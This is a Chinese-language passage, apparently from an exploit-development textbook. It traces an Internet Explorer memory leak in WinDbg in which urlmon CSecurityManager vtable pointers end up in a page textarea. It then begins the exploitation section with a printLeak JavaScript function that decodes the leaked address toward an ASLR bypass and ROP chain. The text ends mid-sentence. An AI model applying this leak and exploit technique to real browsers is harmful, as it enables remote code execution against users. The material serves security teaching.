

```
0:007> !heap -p -a 04ec71b8
address 04ec71b8 found in
_HEAP @ 420000
HEAP_ENTRY Size Prev Flags UserPtr UserSize - state
04ec71b0 0010 0000 [00] 04ec71b8 00078 - (busy)
```

```
0:007> gu
0:007> gu
0:007> !heap -p -a 04ec71b8
address 04ec71b8 found in
_HEAP @ 420000
HEAP_ENTRY Size Prev Flags UserPtr UserSize - state
04ec71b0 0010 0000 [00] 04ec71b8 00078 - (free)
```

可以看到该 chunk 现已空闲并可供重新分配。如果跟踪我们之前看到从 MSHTML!CStr::_Alloc 函数分配的另一个 chunk，会发现它也在各个时间点被释放。我们将继续在 urlmon!CoInternetCreateSecurityManager 上启用断点：

```
0:007> be 4
0:007> g
Breakpoint 4 hit
eax=03b38f70 ebx=03010500 ecx=00000000 edx=0000000b esi=6d8471b4 edi=030bae5c
eip=7727fc40 esp=03b38f48 ebp=03b38f7c iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
urlmon!CoInternetCreateSecurityManager:
7727fc40 8bff mov edi,edi
```

由于我们在释放前一个对象后正在创建的对象，并将其设置为类型范围，因此命中了此断点。现在必须在 ole32!CoTaskMemAlloc+0x13 上启用断点，以跟踪用于分配的地址：

```
0:007> be 6
0:007> g
Breakpoint 6 hit
eax=04ec71b8 ebx=03010500 ecx=777ce40c edx=00427920 esi=6d8471b4 edi=030bae5c
eip=75bbea5f esp=03b38f20 ebp=03b38f20 iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
ole32!CoTaskMemAlloc+0x13:
75bbea5f 5d pop ebp
0:007> bd 6
```

EAX 中的地址应该看起来很眼熟。这就是我们迄今一直在跟踪的 chunk 地址。让我们转储其内容，然后单步跳出几个函数，再次转储：

```
0:007> dd 04ec71b8
04ec71b8  000000e2 00610061 00610061 00610061
04ec71c8  00610061 00610061 00610061 00610061
04ec71d8  00610061 00610061 00610061 00610061
04ec71e8  00610061 00610061 00610061 00610061
04ec71f8  00610061 00610061 00610061 00610061
04ec7208  00610061 00610061 00610061 00610061
04ec7218  00610061 00610061 00610061 00610061
04ec7228  00610061 00000061 0892b1a1 8e000000
```

```
0:007> gu
0:007> gu
0:007> dd 04ec71b8
04ec71b8  7725454c 77254504 772544d4 77254514
04ec71c8  00000001 00000001 04ec71c4 00000000
04ec71d8  00000000 00000000 00000000 00000000
04ec71e8  00000000 00000000 77254530 004937e0
04ec71f8  00000000 00000000 00000000 77254530
04ec7208  00000000 00000001 00000000 00000000
04ec7218  77254530 004937e0 00000000 00000000
04ec7228  00000000 00000061 0892b1a1 8e000000
```

查看 chunk 顶部的地址。它们分别是 0x7725442c、0x77254504、0x772544d4 和 0x77254514。让我们在这些地址上运行 dt 命令，看看它们是什么：

```
0:007> dt poi(04ec71b8)
CSecurityManager:::`vftable'
Symbol not found.
0:007> dt poi(04ec71b8+4)
CSecurityManager:::`vftable'
Symbol not found.
0:007> dt poi(04ec71b8+8)
CSecurityManager:::`vftable'
Symbol not found.
0:007> dt poi(04ec71b8+c)
CSecurityManager::CPrivUnknown::`vftable'
```

各种 CSecurityManager 虚函数表的指针以及指向 CSecurityManager::CPrivUnknown 表的指针已被写入。让我们继续执行，可能会看到相同的 VTable 信息写入到其他位置：

```
Breakpoint 7 hit
eax=00000045 ebx=03b39cc4 ecx=00000001 edx=00000000 esi=04ec71b8 edi=0050dafa
eip=754a9d7d esp=03b39bc4 ebp=03b39bcc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
msvcrt!memcpy+0xd3:
754a9d7d 83c602          add     esi,2
0:007> dd edi
0050dafa fdef4504 00610061 00610061 00610061
0050db0a 00610061 00610061 00610061 00610061
0050db1a 00610061 00610061 00610061 00610061
0050db2a 00610061 00610061 00610061 00610061
0050db3a 00610061 00610061 00610061 00610061
0050db4a 00610061 00610061 00610061 00610061
0050db5a 00610061 00610061 00610061 00610061
0050db6a fdef0061 fdeffdef fdeffdef 000afdef
```

请注意，我们命中了早先创建的“break on access”断点，当时我们的 a 最初被写入到浏览器用户界面的可见窗口中。该地址为 0x0050dafa，在此断点时存储在 EDI 寄存器中。ESI 寄存器中的地址是我们一直在跟踪的对象，该对象在 realloc 调用后被释放。你可能会多次命中此断点。在与该地址关联的每次 memcpy 中断后转储该地址的内容后，我们最终得到了上面的输出。

在输入 gu 以单步跳出最后一个 memcpy 调用后，我们得到以下结果：

```
0:005> dd 0050daf8
0050daf8 4504fdef 44d47725 45147725 fffd7725
0050db08 00610061 00610061 00610061 00610061
0050db18 00610061 00610061 00610061 00610061
0050db28 00610061 00610061 00610061 00610061
0050db38 00610061 00610061 00610061 00610061
0050db48 00610061 00610061 00610061 00610061
0050db58 00610061 00610061 00610061 00610061
0050db68 00610061 fdeffdef fdeffdef fdeffdef
```

让进程继续运行后，我们再次查看浏览器窗口，看到如下结果。

![](img/5f597c6a70133069118d9e804ace3775_400_0.png)

中文字符是将 VTable 地址从 Unicode 转换后的显示结果，但我们知道它们真正是什么！作为最终验证，我们将单击“Replace Text With B’s”按钮。我们命中了断点：

```
Breakpoint 7 hit
eax=00000042 ebx=03b398ec ecx=00000034 edx=00000000 esi=04ed7e68 edi=0050dafa
eip=754a9d74 esp=03b397ec ebp=03b397f4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
msvcrt!memcpy+0xca:
754a9d74 8a4601          mov     al,byte ptr [esi+1]
ds:002b:04ed7e69=00
0:005> dd 0050daf8
0050daf8  4504fdef 44d47725 45147725 fffd7725
0050db08  00610061 00610061 00610061 00610061
0050db18  00610061 00610061 00610061 00610061
0050db28  00610061 00610061 00610061 00610061
0050db38  00610061 00610061 00610061 00610061
0050db48  00610061 00610061 00610061 00610061
0050db58  00610061 00610061 00610061 00610061
0050db68  00610061 fdeffdef fdeffdef fdeffdef
0:005> gu
0:007> dc 0050daf8
0050daf8  0042fdef 00420042 00420042 00420042 ...B.B.B.B.B.B.B.
0050db08  00420042 00420042 00420042 00420042 B.B.B.B.B.B.B.B.
0050db18  00420042 00420042 00420042 00420042 B.B.B.B.B.B.B.B.
0050db28  00420042 00420042 00420042 00610061 B.B.B.B.a.a.a.a.
0050db38  00610061 00610061 00610061 00610061 a.a.a.a.a.a.a.a.
0050db48  00610061 00610061 00610061 00610061 a.a.a.a.a.a.a.a.
0050db58  00610061 00610061 00610061 00610061 a.a.a.a.a.a.a.a.
0050db68  00610061 fdeffdef fdeffdef fdeffdef a.a.............
```

这里可以看到，我们命中了由单击警报按钮引起的断点。我们在断点处转储内存以显示其未更改，然后执行 gu，再次转储。可以看到，我们的 B 已经写入到该地址。允许执行继续后，浏览器窗口中出现以下结果。

![](img/5f597c6a70133069118d9e804ace3775_401_0.png)

在浏览器中检查元素时，得到如下结果。

![](img/5f597c6a70133069118d9e804ace3775_402_0.png)

我们需要获取打印到屏幕上的字符的 Unicode 并将其转换为十六进制，以便查看是否与预期一致。我们已确认并跟踪了内存泄漏漏洞，现在让我们进入利用阶段！

## 利用内存泄漏

我们现在需要添加一些简单的 JavaScript 代码行来利用泄漏的地址。首先，我们要确认能够成功访问并将 Unicode 转换为十六进制值。然后，需要定位 RVA 偏移量，并从泄漏地址中减去它以获取基地址。完成后，可以使用 corelanc0d3r 的 mona.py——或者另一个工具，例如 Sascha Schirra 的 Ropper——根据 RVA 偏移量生成 ROP 链。

接下来我们将使用文件 Leaked_urlmon.html。首先，来看看用于转换泄漏地址的 printLeak 函数的添加：

```
function printLeak() {
    var text = document.getElementById("textarea"); // Getting swapped element
    var leak = text.value.substring(0, 2); // Grabbing index[0:2]
    var hex = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16);
    // parseInt( leak.charCodeAt(1).toString(16)
    // + leak.charCodeAt(0).toString(16), 16 )
    // Above line lifted on April 20th, 2017 from:
    // https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/
    // windows/browser/ms13_037_svg_dashstyle.rb
    text.value = "Leaked address: 0x"+hex.toString(16) + " - urlmon!CSecurityManager::`vftable'";
}
```

我们逐行分析。首先是第一行：

```
var text = document.getElementById("textarea");
```

此行仅根据 ID 获取 textarea 元素，并将其分配给变量 text。

在第二行中，我们创建一个名为 leak 的变量，并访问页面上打印的前两个 Unicode 字符：

```
var leak = text.value.substring(0, 2);
```

我们之前看到的第一个字符是 蕃。让我们使用在线转换器来打印出

